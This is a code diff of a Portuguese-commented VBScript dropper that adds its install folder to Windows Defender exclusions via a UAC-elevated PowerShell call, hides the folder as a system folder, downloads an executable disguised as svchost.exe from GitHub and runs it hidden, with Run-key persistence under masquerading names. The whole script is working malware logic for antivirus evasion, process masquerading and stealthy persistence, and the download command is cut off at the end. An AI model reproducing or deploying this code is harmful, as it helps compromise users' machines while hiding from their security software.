@@ -1,26 +1,19 @@
 ' installer.vbs — Verificador/instalador do svchost.exe
 '
-' Fluxo:
-'   1. svchost.exe existe na pasta?
-'        - NÃO → Passo 2 (instalar)
-'        - SIM → Passo 3 (checar se está rodando)
-'
-'   2. INSTALAR:
-'        - Pasta está na exclusão do Defender?
-'            - NÃO → pede UAC 1x, adiciona A PASTA na exclusão
-'            - SIM → pula UAC
-'        - Baixa svchost.exe, move pra pasta, roda. Fim.
-'
-'   3. JÁ EXISTE NA PASTA:
-'        - Está rodando? SIM → sai quieto.
-'        - NÃO → espera 10s (dá tempo do Run do main.py abrir)
-'              → checa de novo:
-'                  - subiu → sai quieto
-'                  - não subiu → garante pasta na exclusão (UAC se preciso)
-'                              → abre o svchost.exe → sai
+' ORDEM DAS COISAS (sempre):
+'   1. Checa se a PASTA está na exclusão do Defender.
+'        - NÃO está → pede UAC e adiciona a PASTA.
+'        - Está     → segue sem pedir UAC.
+'   2. Checa se o svchost.exe existe na pasta.
+'        - NÃO existe → baixa do GitHub, move, roda.
+'        - Existe     → checa se está rodando:
+'                        - RODANDO    → sai quieto.
+'                        - NÃO RODANDO → espera 10s, recheca.
+'                                        - Subiu    → sai quieto.
+'                                        - Não subiu → abre ele.
 '
 ' Persistência: o Run do main.py ("svchost") e o Run do VBS ("WindowsCacheSvc")
-' coexistem. O VBS nunca remove nada do Run.
+' coexistem. O VBS nunca mexe no Run.
 
 Option Explicit
 
@@ -30,7 +23,7 @@ Dim vbsPath, psKill, tentativasMove
 Dim regRun, regValorNome, regInstalador
 Dim psTask, taskName
 Dim pastaDefender, psExclusao, cmdElevar, psChecker
-Dim psCheckProc, regAtual, rc2
+Dim psCheckProc, regAtual, arquivoExiste
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -57,64 +50,26 @@ pastaDefender = destino
 
 
 ' =====================================================================
-' Funções auxiliares
+' PASSO 0 — Checa a PASTA na exclusão do Defender (SEMPRE).
+'           Se não estiver, pede UAC e adiciona a pasta.
 ' =====================================================================
+psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+            "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
+            "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
+            "$achou = $false; " & _
+            "foreach ($e in $excl) { " & _
+            "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
+            "}; " & _
+            "if ($achou) { exit 0 } else { exit 1 }" & _
+            """"
 
-' Verifica se o svchost.exe (da pasta) está rodando.
-' Retorna True se está rodando, False se não.
-Function SvchostEstaRodando()
-    Dim ps
-    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-         "$alvo = '" & destinoExe & "'.ToLower(); " & _
-         "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
-         "if ($procs.Count -eq 0) { exit 1 }; " & _
-         "$achou = $false; $semPath = $false; " & _
-         "foreach ($p in $procs) { " & _
-         "  try { " & _
-         "    $exe = $p.Path; " & _
-         "    if (-not $exe) { $semPath = $true; continue } " & _
-         "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
-         "  } catch { $semPath = $true } " & _
-         "}; " & _
-         "if ($achou) { exit 0 }; " & _
-         "if ($semPath) { exit 0 }; " & _
-         "exit 1" & _
-         """"
+rc = 1
+On Error Resume Next
+rc = shell.Run(psChecker, 0, True)
+On Error Goto 0
 
-    Dim r
-    r = 1
-    On Error Resume Next
-    r = shell.Run(ps, 0, True)
-    On Error Goto 0
-
-    SvchostEstaRodando = (r = 0)
-End Function
-
-' Verifica se a PASTA já está na exclusão do Defender.
-' Retorna True se está excluída, False se não.
-Function PastaEstaExcluida()
-    Dim ps, r
-    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
-         "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
-         "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
-         "$achou = $false; " & _
-         "foreach ($e in $excl) { " & _
-         "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
-         "}; " & _
-         "if ($achou) { exit 0 } else { exit 1 }" & _
-         """"
-
-    r = 1
-    On Error Resume Next
-    r = shell.Run(ps, 0, True)
-    On Error Goto 0
-
-    PastaEstaExcluida = (r = 0)
-End Function
-
-' Pede UAC e adiciona a PASTA na exclusão do Defender.
-' Não adiciona o processo svchost.exe — só a pasta.
-Sub AdicionarPastaNaExclusao()
+If rc <> 0 Then
+    ' Pasta não está na exclusão → pede UAC e adiciona a PASTA.
     psExclusao = "$p = '" & pastaDefender & "'; " & _
                  "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue"
     psExclusao = Replace(psExclusao, "'", "''")
@@ -127,14 +82,12 @@ Sub AdicionarPastaNaExclusao()
     On Error Resume Next
     shell.Run cmdElevar, 0, True
     On Error Goto 0
-End Sub
+End If
 
 
 ' =====================================================================
 ' PASSO 1 — svchost.exe existe na pasta?
 ' =====================================================================
-
-Dim arquivoExiste
 arquivoExiste = False
 tamArquivo = 0
 
@@ -152,8 +105,29 @@ If arquivoExiste Then
     ' =================================================================
     ' PASSO 3 — JÁ EXISTE NA PASTA. Está rodando?
     ' =================================================================
+    psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
+                  "$alvo = '" & destinoExe & "'.ToLower(); " & _
+                  "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
+                  "if ($procs.Count -eq 0) { exit 1 }; " & _
+                  "$achou = $false; $semPath = $false; " & _
+                  "foreach ($p in $procs) { " & _
+                  "  try { " & _
+                  "    $exe = $p.Path; " & _
+                  "    if (-not $exe) { $semPath = $true; continue } " & _
+                  "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
+                  "  } catch { $semPath = $true } " & _
+                  "}; " & _
+                  "if ($achou) { exit 0 }; " & _
+                  "if ($semPath) { exit 0 }; " & _
+                  "exit 1" & _
+                  """"
 
-    If SvchostEstaRodando() Then
+    rc = 1
+    On Error Resume Next
+    rc = shell.Run(psCheckProc, 0, True)
+    On Error Goto 0
+
+    If rc = 0 Then
         ' Está rodando → sai quieto.
         WScript.Quit 0
     End If
@@ -161,18 +135,18 @@ If arquivoExiste Then
     ' Não está rodando. Espera 10s pro Run do main.py abrir ele no boot.
     WScript.Sleep 10000
 
-    ' Checa de novo.
-    If SvchostEstaRodando() Then
-        ' O Run do main.py abriu ele nesse meio tempo → sai quieto.
+    ' Recheca.
+    rc = 1
+    On Error Resume Next
+    rc = shell.Run(psCheckProc, 0, True)
+    On Error Goto 0
+
+    If rc = 0 Then
+        ' O Run do main.py abriu nesse meio tempo → sai quieto.
         WScript.Quit 0
     End If
 
-    ' Ainda não está rodando. Antes de abrir, garante a pasta na exclusão.
-    If Not PastaEstaExcluida() Then
-        AdicionarPastaNaExclusao()
-    End If
-
-    ' Abre o svchost.exe.
+    ' Ainda não está rodando → abre o svchost.exe.
     On Error Resume Next
     shell.Run """" & destinoExe & """", 0, False
     On Error Goto 0
@@ -192,11 +166,6 @@ If Not fso.FolderExists(destino) Then
 End If
 shell.Run "attrib +h +s """ & destino & """", 0, True
 On Error Goto 0
-
-' Checa a exclusão da pasta. Se já está, pula o UAC.
-If Not PastaEstaExcluida() Then
-    AdicionarPastaNaExclusao()
-End If
 
 ' Baixa svchost.exe do GitHub.
 cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
